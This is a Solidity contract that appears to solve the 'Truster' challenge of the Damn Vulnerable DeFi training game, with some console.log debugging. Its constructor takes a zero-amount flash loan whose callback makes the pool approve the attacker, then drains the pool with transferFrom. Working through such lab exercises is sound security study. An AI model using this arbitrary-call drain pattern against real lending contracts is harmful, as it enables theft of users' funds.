pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPoolConsole.sol";
// experimenting with console.log
import "@nomiclabs/buidler/console.sol";

contract TransfererAttackerConsole {

    IERC20 public damnValuableToken;
    address public attacker;
    address public pool;
    TrusterLenderPoolConsole public lender;

    constructor (address tokenAddress, address _pool, uint amount) public {
        lender = TrusterLenderPoolConsole(_pool);
        damnValuableToken = IERC20(tokenAddress);
        pool = _pool;
        bytes memory callData = abi.encodeWithSignature(
              "approve(address,uint256)",
              address(this),
              amount
          );
        console.log("Logging the calldata from Solidity: ", string(callData));
        lender.flashLoan(
          0, 
          msg.sender, 
          tokenAddress,
          callData
        );
        damnValuableToken.transferFrom(pool, msg.sender, amount);
    }
}
